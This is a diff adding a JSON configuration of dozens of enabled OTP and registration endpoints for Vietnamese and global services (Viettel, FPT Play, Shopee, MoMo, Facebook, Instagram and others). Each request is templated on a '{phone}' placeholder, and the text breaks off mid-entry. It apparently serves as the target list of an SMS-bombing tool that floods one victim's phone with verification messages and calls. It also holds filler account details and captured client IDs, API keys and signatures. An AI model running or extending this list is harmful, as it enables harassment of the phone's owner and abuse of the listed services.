@@ -1,0 +1,1569 @@
+{
+  "market": "vn",
+  "count": 96,
+  "apis": [
+    {
+      "name": "sapo",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.sapo.vn/fnb/sendotp",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phonenumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "viettel_login",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://viettel.vn/api/getOTPLoginCommon",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "phone": "{phone}",
+        "typeCode": "DI_DONG",
+        "actionCode": "myviettel://login_mobile",
+        "type": "otp_login"
+      },
+      "enabled": true
+    },
+    {
+      "name": "viettel_otp_login",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://viettel.vn/api/get-otp-login",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "phone": "{phone}",
+        "type": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "viettel_register",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://viettel.vn/api/get-otp",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "msisdn": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "viettel_contract",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://viettel.vn/api/get-otp-contract-mobile",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "msisdn": "{phone}",
+        "type": "register"
+      },
+      "enabled": true
+    },
+    {
+      "name": "vietteltelecom",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://vietteltelecom.vn/api/get-otp-login",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "phone": "{phone}",
+        "type": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "viettelpost",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://id.viettelpost.vn/Account/SendOTPByPhone",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "FormRegister.FullName": "Nguyen Van A",
+        "FormRegister.Phone": "{phone}",
+        "FormRegister.Password": "Abc@12345",
+        "FormRegister.ConfirmPassword": "Abc@12345",
+        "ConfirmOtpType": "Register",
+        "FormRegister.IsRegisterFromPhone": "true"
+      },
+      "enabled": true
+    },
+    {
+      "name": "viettelmoney",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api8.viettelpay.vn/customer/v2/accounts/register",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "identityType": "msisdn",
+        "identityValue": "{phone}",
+        "type": "REGISTER"
+      },
+      "enabled": true
+    },
+    {
+      "name": "tv360",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://tv360.vn/public/v1/auth/get-otp-login",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "msisdn": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "mocha",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "msisdn": "{phone}",
+        "languageCode": "vi"
+      },
+      "enabled": true
+    },
+    {
+      "name": "mocha35",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "clientType": "ios",
+        "countryCode": "VN",
+        "device": "iPhone15,3",
+        "os_version": "iOS_17.0.2",
+        "platform": "ios",
+        "revision": "11224",
+        "username": "{phone}",
+        "version": "1.28"
+      },
+      "enabled": true
+    },
+    {
+      "name": "fptplay_register",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp",
+      "headers": {
+        "Content-Type": "application/json; charset=UTF-8"
+      },
+      "json": {
+        "phone": "{phone}",
+        "country_code": "VN",
+        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
+      },
+      "enabled": true
+    },
+    {
+      "name": "fptplay_reset",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp",
+      "headers": {
+        "Content-Type": "application/json; charset=UTF-8"
+      },
+      "json": {
+        "phone": "{phone}",
+        "country_code": "VN",
+        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
+      },
+      "enabled": true
+    },
+    {
+      "name": "fptplay_resend",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.fptplay.net/api/v7.1_w/user/otp/resend_otp",
+      "headers": {
+        "Content-Type": "application/json; charset=UTF-8"
+      },
+      "json": {
+        "phone": "{phone}",
+        "country_code": "VN",
+        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8"
+      },
+      "enabled": true
+    },
+    {
+      "name": "vieon",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.vieon.vn/backend/user/v2/register",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "platform": "web",
+        "ui": "012021"
+      },
+      "json": {
+        "username": "{phone}",
+        "country_code": "VN",
+        "model": "Windows 10",
+        "device_id": "f812a55d1d5ee2b87a927833df2608bc",
+        "device_name": "Edge/127",
+        "device_type": "desktop",
+        "platform": "web",
+        "ui": "012021"
+      },
+      "enabled": true
+    },
+    {
+      "name": "vieon_mobile",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.vieon.vn/backend/user/register/mobile",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "params": {
+        "platform": "mobile_web",
+        "ui": "012021"
+      },
+      "form": {
+        "phone_number": "{phone}",
+        "password": "Vexx007",
+        "given_name": "",
+        "device_id": "7c775cd1cd49a31c3893ca1e09abbde3",
+        "platform": "mobile_web",
+        "model": "Android 10",
+        "push_token": "",
+        "device_name": "Chrome/110",
+        "device_type": "desktop",
+        "ui": "012021"
+      },
+      "enabled": true
+    },
+    {
+      "name": "ghn",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}",
+        "type": "register"
+      },
+      "enabled": true
+    },
+    {
+      "name": "lottemart",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "username": "{phone}",
+        "case": "register"
+      },
+      "enabled": true
+    },
+    {
+      "name": "dienmayxanh",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phoneNumber": "{phone}",
+        "isReSend": "false",
+        "sendOTPType": "1"
+      },
+      "enabled": true
+    },
+    {
+      "name": "tgdd",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phoneNumber": "{phone}",
+        "isReSend": "false",
+        "sendOTPType": "1"
+      },
+      "enabled": true
+    },
+    {
+      "name": "shopee",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://shopee.vn/api/v4/otp/get_settings_v2",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-api-source": "pc",
+        "x-shopee-language": "vi",
+        "x-requested-with": "XMLHttpRequest"
+      },
+      "json": {
+        "operation": 8,
+        "encrypted_phone": "",
+        "phone": "{phone}",
+        "supported_channels": [
+          1,
+          2,
+          3,
+          6,
+          0,
+          5
+        ],
+        "support_session": true
+      },
+      "enabled": true
+    },
+    {
+      "name": "f88_pawn",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.f88.vn/growth/webf88vn/api/v1/Pawn",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "FullName": "Nguyen Van A",
+        "Phone": "{phone}",
+        "DistrictCode": "024",
+        "ProvinceCode": "02",
+        "AssetType": "Car",
+        "IsChoose": "1",
+        "ShopCode": "",
+        "Url": "https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan",
+        "FormType": 1
+      },
+      "enabled": true
+    },
+    {
+      "name": "f88_appvay",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phoneNumber": "{phone}",
+        "recaptchaResponse": "",
+        "source": "Online"
+      },
+      "enabled": true
+    },
+    {
+      "name": "spacet",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.spacet.vn/www/user/phone",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "spacet_api",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.spacet.vn/api/v1/auth/otp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "vinpearl",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "channel": "vpt",
+        "username": "{phone}",
+        "type": 1,
+        "OtpChannel": 1
+      },
+      "enabled": true
+    },
+    {
+      "name": "traveloka",
+      "market": "vn",
+      "phone_fmt": "vn84plus",
+      "method": "POST",
+      "url": "https://www.traveloka.com/api/v2/user/signup",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-domain": "user",
+        "x-route-prefix": "vi-vn"
+      },
+      "json": {
+        "fields": [],
+        "data": {
+          "userLoginMethod": "PN",
+          "username": "{phone}"
+        },
+        "clientInterface": "desktop"
+      },
+      "enabled": true
+    },
+    {
+      "name": "galaxyplay",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.glxplay.io/account/phone/checkPhoneOnly",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "galaxyplay_verify",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.glxplay.io/account/phone/verify",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "emartmall",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://emartmall.com.vn/index.php?route=account/register/smsRegister",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "mobile": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "ahamove_login",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.ahamove.com/api/v3/public/user/login",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "mobile": "{phone}",
+        "country_code": "VN",
+        "firebase_sms_auth": true
+      },
+      "enabled": true
+    },
+    {
+      "name": "ahamove_register",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.ahamove.com/api/v3/public/user/register",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "mobile": "{phone}",
+        "name": "Nguyen Van A",
+        "email": "abc@gmail.com",
+        "country_code": "VN",
+        "firebase_sms_auth": true
+      },
+      "enabled": true
+    },
+    {
+      "name": "xanhsm_sms",
+      "market": "vn",
+      "phone_fmt": "vn84plus",
+      "method": "POST",
+      "url": "https://api.gsm-api.net/auth/v1/public/otp/send",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "aud": "user_app",
+        "platform": "ios"
+      },
+      "json": {
+        "is_forgot_password": false,
+        "phone": "{phone}",
+        "provider": "VIET_GUYS"
+      },
+      "enabled": true
+    },
+    {
+      "name": "xanhsm_zalo",
+      "market": "vn",
+      "phone_fmt": "vn84plus",
+      "method": "POST",
+      "url": "https://api.gsm-api.net/auth/v1/public/otp/send",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "aud": "user_app",
+        "platform": "ios"
+      },
+      "json": {
+        "is_forgot_password": false,
+        "phone": "{phone}",
+        "provider": "ZNS_ZALO"
+      },
+      "enabled": true
+    },
+    {
+      "name": "popeyes",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.popeyes.vn/api/v1/register",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-client": "WebApp"
+      },
+      "json": {
+        "phone": "{phone}",
+        "firstName": "Nguyen",
+        "lastName": "Van A",
+        "email": "abc123@gmail.com",
+        "password": "Abc@12345"
+      },
+      "enabled": true
+    },
+    {
+      "name": "acheckin",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://id.acheckin.vn/api/graphql/v2/mobile",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "operationName": "RequestVoiceOTP",
+        "variables": {
+          "phone_number": "{phone}",
+          "action": "REGISTER",
+          "hash": "6af5e4ed78ee57fe21f0d405c752798f"
+        },
+        "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) { requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash) }"
+      },
+      "enabled": true
+    },
+    {
+      "name": "appota_register",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone_number": "{phone}",
+        "sender": "SMS",
+        "ts": 1722417441,
+        "signature": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
+      },
+      "enabled": true
+    },
+    {
+      "name": "appota_vn",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://vi.appota.com/check-phone-register.html",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phone_number": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "watsons",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "lang": "vi"
+      },
+      "json": {
+        "otpTokenRequest": {
+          "action": "REGISTRATION",
+          "type": "SMS",
+          "countryCode": "84",
+          "target": "{phone}"
+        },
+        "defaultAddress": {
+          "mobileNumberCountryCode": "84",
+          "mobileNumber": "{phone}"
+        },
+        "mobileNumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "hoangphuc",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://hoang-phuc.com/advancedlogin/otp/sendotp/",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "action_type": "1",
+        "tel": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "fmcomvn",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "Phone": "{phone}",
+        "LatOfMap": "106",
+        "LongOfMap": "108",
+        "Browser": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "thefaceshop",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phoneNumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "beautybox",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phoneNumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "futabus",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.vato.vn/api/authenticate/request_code",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phoneNumber": "{phone}",
+        "deviceId": "d46a74f1-09b9-4db6-b022-aaa9d87e11ed",
+        "use_for": "LOGIN"
+      },
+      "enabled": true
+    },
+    {
+      "name": "tokyolife",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone_number": "{phone}",
+        "name": "Nguyen Van A",
+        "password": "pUL3.GFSd4MWYXp",
+        "email": "abc@gmail.com",
+        "birthday": "2002-03-12",
+        "gender": "male"
+      },
+      "enabled": true
+    },
+    {
+      "name": "30shine",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "cathaylife",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "memberMap": "{\"userName\":\"abc@gmail.com\",\"phone\":\"{phone}\",\"email\":\"abc@gmail.com\",\"LINK_FROM\":\"signUp2\",\"CUSTOMER_NAME\":\"Nguyen Van A\"}",
+        "OTP_TYPE": "P",
+        "LANGS": "vi_VN"
+      },
+      "enabled": true
+    },
+    {
+      "name": "dominos_vn",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://dominos.vn/api/v1/users/send-otp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone_number": "{phone}",
+        "email": "abc@gmail.com",
+        "type": 0,
+        "is_register": true
+      },
+      "enabled": true
+    },
+    {
+      "name": "vinamilk",
+      "market": "vn",
+      "phone_fmt": "vn84plus",
+      "method": "POST",
+      "url": "https://new.vinamilk.com.vn/api/account/getotp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "type": "register",
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "batdongsan",
+      "market": "vn",
+      "method": "GET",
+      "url": "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "phoneNumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "gumac",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://cms.gumac.vn/api/v1/customers/verify-phone-number",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "vietair",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://vietair.com.vn/Handler/CoreHandler.ashx",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "op": "PACKAGE_HTTP_POST",
+        "path_ajax_post": "/service03/sms/get",
+        "package_name": "PK_FD_SMS_OTP",
+        "object_name": "INS",
+        "P_MOBILE": "{phone}",
+        "P_TYPE_ACTIVE_CODE": "DANG_KY_NHAN_OTP"
+      },
+      "enabled": true
+    },
+    {
+      "name": "fahasa",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.fahasa.com/ajaxlogin/ajax/checkPhone",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "shopiness",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://shopiness.vn/ajax/user",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "action": "verify-registration-info",
+        "phoneNumber": "{phone}",
+        "refCode": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "moca",
+      "market": "vn",
+      "method": "GET",
+      "url": "https://moca.vn/moca/v2/users/role",
+      "headers": {
+        "Accept": "*/*",
+        "X-Requested-With": "XMLHttpRequest",
+        "X-Moca-Api-Version": "2",
+        "platform": "P_IOS-2.10.42"
+      },
+      "params": {
+        "phoneNumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "pantio",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.suplo.vn/v1/auth/customer/otp/sms/generate",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "params": {
+        "domain": "pantiofashion.myharavan.com"
+      },
+      "form": {
+        "phoneNumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "routine",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://routine.vn/customer/otp/send/",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "telephone": "{phone}",
+        "isForgotPassword": "0"
+      },
+      "enabled": true
+    },
+    {
+      "name": "pico",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://auth.pico.vn/user/api/auth/login/request-otp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "pnj",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.pnj.com.vn/customer/otp/request",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "_method": "POST",
+        "_token": "0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU",
+        "type": "zns",
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "takomo",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://lk.takomo.vn/api/4/client/otp/send",
+      "headers": {
+        "Content-Type": "application/json;charset=UTF-8"
+      },
+      "json": {
+        "data": {
+          "phone": "{phone}",
+          "code": "resend",
+          "channel": "ivr"
+        }
+      },
+      "enabled": true
+    },
+    {
+      "name": "zalopay",
+      "market": "vn",
+      "method": "GET",
+      "url": "https://api.zalopay.vn/v2/account/phone/status",
+      "headers": {
+        "Accept": "*/*"
+      },
+      "params": {
+        "phone_number": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "moneyveo",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://moneyveo.vn/vi/registernew/sendsmsjson/",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phoneNumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "funring",
+      "market": "vn",
+      "method": "POST",
+      "url": "http://funring.vn/api/v1.0.1/jersey/user/getotp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "username": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "cozmo",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://cozmo.vn/api/track-user",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "lead_id": "743b8b9b-b34a-4d9c-9f65-53ccb5e866c7",
+        "session_id": "ae1e4a30-0218-4f7e-a74d-560dba744b94",
+        "uuid": "5138FF9F-AEC0-4DC3-85A6-3B1A81133CC5",
+        "action_name": "FullNamePageSuccess",
+        "action_data": "{}",
+        "mobile": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "momo",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",
+      "headers": {
+        "Content-Type": "application/json",
+        "agent_id": "undefined",
+        "sessionkey": "",
+        "user_phone": "undefined",
+        "app_version": "31062",
+        "app_code": "3.1.6",
+        "device_os": "ANDROID"
+      },
+      "json": {
+        "user": "{phone}",
+        "msgType": "SEND_OTP_MSG",
+        "cmdId": "1700000000000000",
+        "lang": "vi",
+        "time": 1700000000000,
+        "channel": "APP",
+        "appVer": 31062,
+        "appCode": "3.1.6",
+        "deviceOS": "ANDROID",
+        "buildNumber": 0,
+        "appId": "vn.momo.platform",
+        "result": true,
+        "errorCode": 0,
+        "errorDesc": "",
+        "momoMsg": {
+          "_class": "mservice.backend.entity.msg.RegDeviceMsg",
+          "number": "{phone}",
+          "imei": "00000000-0000-0000-0000-000000000000",
+          "cname": "Vietnam",
+          "ccode": "084",
+          "device": "CPH1605",
+          "firmware": "23",
+          "hardware": "mt6755",
+          "manufacture": "OPPO",
+          "csp": "",
+          "icc": "",
+          "mcc": "452",
+          "device_os": "Android",
+          "secure_id": "00000000000000000"
+        },
+        "extra": {
+          "action": "SEND",
+          "rkey": "0000000000000000000000",
+          "AAID": "00000000-0000-0000-0000-000000000000",
+          "IDFA": "",
+          "TOKEN": "0000:0000-0000-0000-0000-0000-0000000000000000000000000000000000_0000-0000",
+          "SIMULATOR": "",
+          "SECUREID": "00000000000000000",
+          "MODELID": "oppo cph1605",
+          "isVoice": true,
+          "REQUIRE_HASH_STRING_OTP": true,
+          "checkSum": ""
+        }
+      },
+      "enabled": true
+    },
+    {
+      "name": "vntrip",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://micro-services.vntrip.vn/core-user-service/verification/request/phone",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "feature": "register",
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "popsww",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://products.popsww.com/api/v5/auths/register",
+      "headers": {
+        "Content-Type": "application/json",
+        "api-key": "5d2300c2c69d24a09cf5b09b",
+        "lang": "vi",
+        "platform": "web",
+        "profileid": "62e58a27c6f857005396318f",
+        "x-env": "production",
+        "sub-api-version": "1.1"
+      },
+      "json": {
+        "fullName": "Nguyen Van A",
+        "account": "{phone}",
+        "password": "Abcaxgh@1",
+        "confirmPassword": "Abcaxgh@1"
+      },
+      "enabled": true
+    },
+    {
+      "name": "swift247",
+      "market": "vn",
+      "phone_fmt": "vn84",
+      "method": "POST",
+      "url": "https://api.swift247.vn/v1/check_phone",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phone": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "phuclong",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api-crownx.winmart.vn/as/api/plg/v1/user/register",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phoneNumber": "{phone}",
+        "fullName": "Le Van Sang",
+        "email": "abc@gmail.com",
+        "password": "Vrxx#1337"
+      },
+      "enabled": true
+    },
+    {
+      "name": "vietlott",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "phoneNumber": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "ubofood",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://ubofood.com/api/v1/account/customers/register",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phone_number": "{phone}",
+        "trade_code": "379760000"
+      },
+      "enabled": true
+    },
+    {
+      "name": "vamo",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://vamo.vn/ws/api/public/login-with-otp/generate-otp",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "json": {
+        "username": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "kiotviet",
+      "market": "vn",
+      "phone_fmt": "vn84plus",
+      "method": "POST",
+      "url": "https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "form": {
+        "phone": "{phone}",
+        "code": "abc123",
+        "name": "le van sang",
+        "email": "",
+        "zone": "An Giang - Huyen Chau Phu",
+        "merchant": "muabansi",
+        "username": "{phone}",
+        "industry": "Thoi trang",
+        "ref_code": "746",
+        "industry_id": "77",
+        "phone_input": "{phone}"
+      },
+      "enabled": true
+    },
+    {
+      "name": "instagram",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.instagram.com/accounts/account_recovery_send_ajax/",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "email_or_username": "{phone}",
+        "recaptcha_challenge_field": ""
+      },
+      "enabled": true
+    },
+    {
+      "name": "facebook",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://www.facebook.com/ajax/phone/confirmation",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "form": {
+        "contact_point": "{phone}",
+        "verification_type": "code_sms",
+        "state": "1",
+        "source": "www_mobile_settings",
+        "country": "VN"
+      },
+      "enabled": true
+    },
+    {
+      "name": "meta_vn",
+      "market": "vn",
+      "method": "POST",
+      "url": "https://meta.vn/app_scripts/pages/AccountReact.aspx",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "params": {
+        "api_mode": "1"
+      },
+      "json": {
+        "api_args": {
+          "lgUser": "{phone}",
+          "act": "send",
+          "type": "phone"
+        },
+        "api_method": "CheckExist"
+      },
+      "enabled": true
+    },
+    {
+      "name": "concung",
+      "market": "vn",
+      "method": "POST",
